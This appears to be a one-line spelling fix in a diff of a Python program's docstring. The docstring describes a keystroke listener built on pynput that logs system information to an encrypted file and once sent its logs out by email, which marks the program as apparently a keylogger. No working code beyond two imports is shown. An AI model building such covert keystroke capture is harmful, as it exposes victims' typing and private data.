@@ -6,7 +6,7 @@ It also logs the system information and sends it to a file and encrypts it.
 Dont forget to install and import the pynput library.
 Use: pip install pynput
 Press esc to stop the listener and to encrypt the files.
-This had email incorporated but sadly google changed their policies and I havent found a way to work around that.
+This had email incorporated but sadly google changed their policies and I haven't found a way to work around that.
 '''
 import sys #This is for exiting the program
 import wmi #This will only work on windows
